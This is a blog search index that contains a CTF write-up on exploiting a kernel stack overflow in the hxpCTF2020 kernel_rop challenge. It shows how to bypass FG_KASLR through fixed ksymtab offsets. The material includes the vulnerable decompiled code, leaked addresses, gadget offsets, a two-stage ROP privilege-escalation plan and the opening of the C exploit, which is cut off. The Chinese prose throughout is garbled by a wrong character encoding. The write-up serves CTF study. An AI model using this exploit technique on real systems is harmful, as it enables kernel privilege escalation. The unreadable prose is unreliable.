<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>I am back</title>
      <link href="/2022/02/21/iamback/"/>
      <url>/2022/02/21/iamback/</url>
      
        <content type="html"><![CDATA[<p>è€ƒç ”ç»“æŸæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä¹Ÿä¼‘æ¯è°ƒæ•´çš„å·®ä¸å¤šäº†ï¼Œæ˜¯æ—¶å€™é‡å¯æ›´æ–°è®¡åˆ’äº†ğŸ›¡</p>]]></content>
      
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kernel_pwn FG_KASLR in ROP</title>
      <link href="/2021/02/10/kernel_pwn(fg_kaslr)/"/>
      <url>/2021/02/10/kernel_pwn(fg_kaslr)/</url>
      
        <content type="html"><![CDATA[<h3 id="Kernel-pwn-FG-KASLR-in-ROP"><a href="#Kernel-pwn-FG-KASLR-in-ROP" class="headerlink" title="Kernel_pwn FG_KASLR in ROP"></a>Kernel_pwn FG_KASLR in ROP</h3><blockquote><p>ç¬¬ä¸€æ¬¡é‡åˆ°FG_KASLRæœºåˆ¶ï¼Œç®—æ˜¯KASLRçš„åŠ å¼ºç‰ˆï¼ŒåŠ å¤§äº†ä¸€äº›ROPçš„éš¾åº¦ï¼Œä½†ä»æœ‰bypassçš„æ–¹æ³•ã€‚é¢˜ç›®æ¥è‡ªhxpCTF2020 kernel_ropã€‚</p></blockquote><span id="more"></span><h4 id="FG-KASLR"><a href="#FG-KASLR" class="headerlink" title="FG_KASLR"></a><code>FG_KASLR</code></h4><p>é¦–å…ˆäº†è§£ä¸‹FG_KASLRï¼š<br>å…¨ç§°æ˜¯<code>Function Granular KASLR</code>ï¼Œè¯‘ä¸ºå‡½æ•°é¢—ç²’åŒ–åœ°å€éšæœºåˆ†å¸ƒã€‚æˆ‘ä»¬çŸ¥é“ï¼Œå¼€å¯ä¸€èˆ¬çš„KASLRä¼šä½¿å¾—æ¯æ¬¡ç›®æ ‡æ–‡ä»¶åŠ è½½åˆ°çš„å†…å­˜èµ·å§‹åœ°å€ä¼šéšæœºåŒ–ï¼Œä½†åªè¦èƒ½leakä¸€ä¸ªåœ¨ç›¸åº”å†…å­˜åŒºåŸŸçš„åœ°å€ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡å…¶offsetå›ºå®šçš„åŸå› å¾—åˆ°ä»»ä½•ä¸€ä¸ªåœ¨æ­¤å†…å­˜åŒºåŸŸçš„åœ°å€ã€‚</p><p>æ–‡æ¡£å¯¹FG_KASLRæè¿°ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This patch set is an implementation of finer grained kernel address space</span><br><span class="line">randomization. It rearranges your kernel code at load time </span><br><span class="line">on a per-function level granularity, with only around a second added to</span><br><span class="line">boot time.</span><br></pre></td></tr></table></figure><p>å’ŒKASLRä¸åŒï¼ŒFG_KASLRåšäº†æ›´éšæœºåŒ–ã€‚å®ƒåœ¨loadçš„æ—¶å€™æŒ‰ç…§å‡½æ•°çº§åˆ«çš„ç»†ç²’åº¦æ¥é‡æ’å†…æ ¸ä»£ç ï¼Œè¿™æ ·åšå®ƒçš„boot timeå¢åŠ äº†1ç§’ï¼Œä½†ä½¿å¾—æˆ‘ä»¬é€šè¿‡offsetçš„æ–¹æ³•å¾—åˆ°çœŸå®åœ°å€çš„æ–¹æ³•â€ç ´ç­â€œã€‚å³ä½¿æˆ‘ä»¬leakå‡ºäº†ä¸€ä¸ªåœ¨.textæ®µçš„åœ°å€ï¼Œä½†FG_KASLRæ˜¯å‡½æ•°çº§ä¸Šçš„éšæœºåŒ–ï¼Œå¯¹å‡½æ•°çš„é‡æ’ä½¿å¾—offsetä¹Ÿå˜å¾—éšæœºåŒ–ï¼Œæˆ‘ä»¬ä¹Ÿå°±æ— æ³•é€šè¿‡<code>leak_addr+offset</code>æ¥ç¡®å®šåœ°å€äº†ã€‚</p><p>è¿™æ˜¯æˆ‘ä¸€å¼€å§‹çœ‹åˆ°è¿™ä¸ªæœºåˆ¶çš„æƒ³æ³•ï¼Œä½†å½“æˆ‘åšåˆ°ä¸€é“å¼€äº†FG_KASLRçš„kernel_pwnä¹‹åï¼Œæ‰å‘ç°æˆ‘too yuang too simpleäº†ã€‚</p><h4 id="hxpCTF2020-kernel-rop"><a href="#hxpCTF2020-kernel-rop" class="headerlink" title="hxpCTF2020 kernel_rop"></a><code>hxpCTF2020 kernel_rop</code></h4><p>æ‹¿åˆ°é¢˜ç›®åå‘ç°å†…æ ¸ç‰ˆæœ¬ä¸º<code>vmlinuz: Linux kernel x86 boot executable bzImage, version 5.9.0-rc6+</code>ç®—æ˜¯æ¯”è¾ƒæ–°äº†ã€‚</p><p>æ¥ç€æŸ¥çœ‹<code>etc/init.d/</code>é‡Œçš„rcSåˆå§‹åŒ–è„šæœ¬çœ‹åˆ°<code>insmodäº†hackme.ko</code>ï¼Œåº”è¯¥å°±æ˜¯æœ‰æ¼æ´çš„æ¨¡å—äº†ã€‚</p><p>æ¨¡å—æä¾›äº†<code>hackme_read()</code>å’Œ<code>hackme_write()</code>åŠŸèƒ½ï¼Œæ¼æ´åœ¨writeåŠŸèƒ½é‡Œï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> __fastcall <span class="title">hackme_write</span><span class="params">(file *f, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> size, <span class="type">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> tmp[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+80h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v5 = v4;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">4096LL</span>);</span><br><span class="line">    <span class="built_in">BUG</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  _check_object_size(hackme_buf, v4, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">copy_from_user</span>(hackme_buf, data, v5) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  _memcpy(tmp, hackme_buf, v5);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_memcpy(tmp, hackme_buf, v5);</code>é€ æˆæ ˆæº¢å‡ºã€‚å› æ­¤åˆ©ç”¨æ–¹æ³•å°±æ¯”è¾ƒæ˜ç¡®äº†ï¼Œå…ˆåˆ©ç”¨readåŠŸèƒ½leakåœ°å€ï¼Œæ‰¾gadgetsï¼Œä¹‹åropæ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(0))</code>ææƒã€‚</p><p>é¦–å…ˆleakåœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(global_fd, leak, sizeof(leak));</span><br></pre></td></tr></table></figure><p>ä¼ å…¥ä¸€ä¸ªleakæ•°ç»„ï¼Œçœ‹ä¸‹éƒ½è¯»åˆ°äº†å•¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0: 0xffff888007201020                                                     </span><br><span class="line">1: 0xfe0</span><br><span class="line">2: 0x71e8e82fd1c6c600</span><br><span class="line">3: 0xffff88800647b210</span><br><span class="line">4: 0xffffc900001c7e68</span><br><span class="line">5: 0x4</span><br><span class="line">6: 0xffff88800647b200</span><br><span class="line">7: 0xffffc900001c7ef0</span><br><span class="line">8: 0xffff88800647b200</span><br><span class="line">9: 0xffffc900001c7e80</span><br><span class="line">10: 0xffffffff8184e047</span><br><span class="line">11: 0xffffffff8184e047</span><br><span class="line">12: 0xffff88800647b200</span><br><span class="line">13: (nil)</span><br><span class="line">14: 0x7fff6f105830</span><br><span class="line">15: 0xffffc900001c7ea0</span><br><span class="line">16: 0x71e8e82fd1c6c600</span><br><span class="line">17: 0x140</span><br><span class="line">18: (nil)</span><br><span class="line">19: 0xffffc900001c7ed8</span><br><span class="line">20: 0xffffffff816d51ff</span><br><span class="line">21: 0xffff88800647b200</span><br><span class="line">22: 0xffff88800647b200</span><br><span class="line">23: 0x7fff6f105830</span><br><span class="line">24: 0x140</span><br><span class="line">25: (nil)</span><br><span class="line">26: 0xffffc900001c7f20</span><br><span class="line">27: 0xffffffff816d5727</span><br><span class="line">28: 0xffffffff8152b8a1</span><br><span class="line">29: (nil)</span><br><span class="line">30: 0x71e8e82fd1c6c600</span><br><span class="line">31: 0xffffc900001c7f58</span><br><span class="line">32: (nil)</span><br><span class="line">33: (nil)</span><br><span class="line">34: (nil)</span><br><span class="line">35: 0xffffc900001c7f30</span><br><span class="line">36: 0xffffffff816d577a</span><br><span class="line">37: 0xffffc900001c7f48</span><br><span class="line">38: 0xffffffff8100a157</span><br><span class="line">39: (nil)</span><br></pre></td></tr></table></figure><p>å¤šé‡å¤leakå‡ æ¬¡åä¼šå‘ç°<code>leak[38]</code>å¤„çš„<code>0xffffffff8100a157</code>æ˜¯æ²¡å˜åŒ–çš„ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€æ˜¯kernel imageé‡Œçš„åœ°å€ï¼Œå› æ­¤é€šè¿‡è¿™ä¸ªåœ°å€æˆ‘ä»¬å®¹æ˜“å¾—åˆ°image_baseçš„åœ°å€ã€‚<br>æ¥ç€æˆ‘ä»¬å…ˆæ‰‹åŠ¨rootä¸‹ï¼Œé€šè¿‡<code>/proc/kallsyms</code>å»æ‰¾æ‰¾å‡½æ•°åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">38: 0xffffffffa820a157                                    </span><br><span class="line">39: (nil)      </span><br><span class="line">image base: 0xffffffffa8200000</span><br><span class="line">/ # cat /proc/kallsyms | grep &quot;commit_creds&quot;</span><br><span class="line">ffffffffa8c93f90 T commit_creds</span><br><span class="line">ffffffffa9187d90 r __ksymtab_commit_creds</span><br><span class="line">ffffffffa91a0972 r __kstrtab_commit_creds</span><br><span class="line">ffffffffa91a4d42 r __kstrtabns_commit_creds</span><br><span class="line"></span><br><span class="line">38: 0xffffffffb260a157</span><br><span class="line">39: (nil)</span><br><span class="line">image base: 0xffffffffb2600000</span><br><span class="line">/ # cat /proc/kallsyms | grep &quot;commit_creds&quot;</span><br><span class="line">ffffffffb2a2e6c0 T commit_creds</span><br><span class="line">ffffffffb3587d90 r __ksymtab_commit_creds</span><br><span class="line">ffffffffb35a0972 r __kstrtab_commit_creds</span><br><span class="line">ffffffffb35a4d42 r __kstrtabns_commit_creds</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯ä¸¤æ¬¡å¯åŠ¨qemuåå…ˆleakåœ°å€åœ¨é€šè¿‡<code>/proc/kallsyms</code>æŸ¥çœ‹å‡½æ•°åœ°å€å¾—åˆ°çš„ç»“æœã€‚<code>commit_creds</code>å‡½æ•°å’Œ<code>image_base</code>çš„offsetåˆ†åˆ«ä¸º0xa93f90å’Œ0x42e6c0ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡<code>image_base+offset</code>æ¥å¾—åˆ°<code>commit_creds()</code>çš„åœ°å€ï¼Œè¿™ä¹Ÿæ˜¯å¼€å¯äº†FG_KASLRçš„æ•ˆæœã€‚</p><p>ä½†åœ¨è®¡ç®—<code>__ksymtab_commit_creds</code>å’Œ<code>image_base</code>çš„åç§»æ—¶å‘ç°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0xffffffffa9187d90-0xffffffffa8200000)</span><br><span class="line">&#x27;0xf87d90L&#x27;</span><br><span class="line">&gt;&gt;&gt; hex(0xffffffffb3587d90-0xffffffffb2600000)</span><br><span class="line">&#x27;0xf87d90L&#x27;</span><br></pre></td></tr></table></figure><p>offsetæ˜¯å›ºå®šçš„ã€‚å¯ä»¥çœ‹åˆ°ï¼ŒFG_KASLRå¹¶æ²¡æœ‰åšåˆ°Kernelåœ°å€çš„å®Œå…¨éšæœºåŒ–ï¼Œæ²¡æœ‰å—åˆ°å½±å“çš„åŒºåŸŸå¦‚ä¸‹ï¼š</p><p>1ã€å­˜åœ¨äº<code>.text_base</code>åˆ°<code>__x86_retpoline_r15(.text+400dc6)</code>çš„å‡½æ•°æ²¡æœ‰å—åˆ°å½±å“ã€‚æ˜¾ç„¶<code>commit_creds</code>å’Œ<code>prepare_kernel_cred()</code>æ²¡æœ‰åŒ…å«åœ¨å†…ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥åœ¨è¿™é‡Œæ‰¾ä¸€äº›gadgetçš„ã€‚</p><p>2ã€KPIT trampoline<code>swapgs_restore_regs_and_return_to_usermode()</code>æ²¡æœ‰å—åˆ°å½±å“ã€‚</p><p>3.å†…æ ¸ç¬¦å·è¡¨(kernel symbol table)ksymtabå¼€å§‹äº<code>.text+0xf85198</code>æ²¡æœ‰å—åˆ°å½±å“ã€‚</p><p>è¿™ä¹Ÿè¯´æ˜äº†æˆ‘ä»¬è®¡ç®—<code>__ksymtab_commit_creds</code>çš„åç§»å›ºå®šçš„åŸå› ã€‚ksymtabçš„ç»“æ„å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">kernel_symbol</span> &#123;</span><br><span class="line">  <span class="type">int</span> value_offset;</span><br><span class="line">  <span class="type">int</span> name_offset;</span><br><span class="line">  <span class="type">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>value_offset</code>æ˜¯ksymtabåˆ°å¯¹åº”å‡½æ•°çš„åç§»ï¼Œä»¥commit_credså‡½æ•°ä¸ºä¾‹å°±æ˜¯<code>__ksymtab_commit_creds + value_offset = commit_creds</code>ã€‚</p><p>ä½¿ç”¨åˆ°çš„gadgetsæœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop_rax_ret = image_base + 0x4d11;</span><br><span class="line">mov_eax_ind_rax_ret = image_base + 0x4aae;</span><br><span class="line">pop_rdi_ret = image_base + 0x38a0;</span><br></pre></td></tr></table></figure><p>æ€è·¯å¦‚ä¸‹ï¼š</p><p>1ã€é€šè¿‡readåŠŸèƒ½leakå‡º<code>image_base</code>å’Œstacké‡Œçš„<code>cookie</code>ï¼Œåˆ†åˆ«å¯¹åº”<code>leak[38]</code>å’Œ<code>leak[2]</code>ã€‚</p><p>2ã€é€šè¿‡<code>image_base+offset</code>è®¡ç®—<code>__ksymtab_commit_creds</code>ï¼Œ<code>__ksymtab_prepare_kernel_cred()</code>ä»¥åŠgadgetsåœ°å€ã€‚</p><p>3ã€æ„é€ ROPï¼Œåˆ©ç”¨gadgetå°†ksymtabçš„<code>value_offset</code>å­˜æ”¾raxï¼Œå†åˆ©ç”¨<code>KPTI trampoline</code>è¿”å›userlandå¾—åˆ°å…¶å€¼ï¼Œè®¡ç®—å¾—çœŸå®å‡½æ•°åœ°å€ï¼Œå†åšä¸€æ¬¡ç±»ä¼¼çš„ROPä»è€Œå¾—åˆ°<code>commit_creds()</code>å’Œ<code>prepare_kernel_cred()</code>å‡½æ•°åœ°å€ã€‚</p><p>4ã€ç”±äºæœ‰KPTIè€Œä¸”æˆ‘ä»¬çš„gadgeté‡Œæ²¡æœ‰èƒ½ç±»ä¼¼<code>mov rdi, rax</code>çš„åŠŸèƒ½ï¼Œåªèƒ½åˆ†è§£åˆ©ç”¨çš„è¿‡ç¨‹ã€‚æˆ‘ä»¬çš„ROPåº”ä½¿ç”¨<code>KPTI trampoline</code>å°†ææƒåˆ†æˆä¸¤ä¸ªstageï¼š1.ROPæ‰§è¡Œ<code>prepare_kernel_cred(0)</code>,æ‰§è¡Œç»“æœäºraxï¼Œåˆ©ç”¨<code>KPTI trampoline</code>è¿”å›userlandå¾—åˆ°raxå€¼(å³<code>cred_struct_va</code>)ã€‚2.ROPæ‰§è¡Œ<code>commit_cred(cred_struct_va)</code>ï¼Œåˆ©ç”¨<code>KPTI trampoline</code>è¿”å›userlandæ‰§è¡Œ<code>system(&#39;/bin/sh&#39;);</code>ã€‚</p><p>exp:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_fd;</span><br><span class="line"><span class="type">char</span> flag_buf[<span class="number">256</span>];</span><br><span class="line"><span class="type">uint64_t</span> cookie;</span><br><span class="line"><span class="type">uint64_t</span> image_base;</span><br><span class="line"><span class="type">uint64_t</span> swapgs_restore_regs_and_ret_to_uspace; <span class="comment">// start after popping rax</span></span><br><span class="line"><span class="type">uint64_t</span> zero_rax_ret; <span class="comment">// xor eax, eax; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> write_mem_ret; <span class="comment">// mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> pop_rax_ret; <span class="comment">// pop rax; ret</span></span><br><span class="line"><span class="type">uint64_t</span> mov_eax_ind_rax_ret; <span class="comment">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> pop_rdi_ret; <span class="comment">// pop rdi; pop rbp; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> ksymtab_prepare_kernel_cred;</span><br><span class="line"><span class="type">uint64_t</span> ksymtab_commit_creds;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds;</span><br><span class="line"><span class="type">uint64_t</span> creds_struct_va;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">current_state</span>&#123;</span><br><span class="line">    current_state_read_ksymtab_prepare_kernel_cred,</span><br><span class="line">    current_state_read_ksymtab_commit_creds,</span><br><span class="line">    current_state_escalate_privileges_stage1,</span><br><span class="line">    current_state_escalate_privileges_stage2,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">safe_exit</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">open_dev</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open faild!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save_state</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%rsp, %3;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %2\n&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags), <span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx %lx %lx %lx\n&quot;</span>, user_cs, user_ss, user_rflags, user_sp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_leak</span><span class="params">(<span class="type">uint64_t</span> leak[], <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ; i &lt; n ; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: %p\n&quot;</span>,i ,leak[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 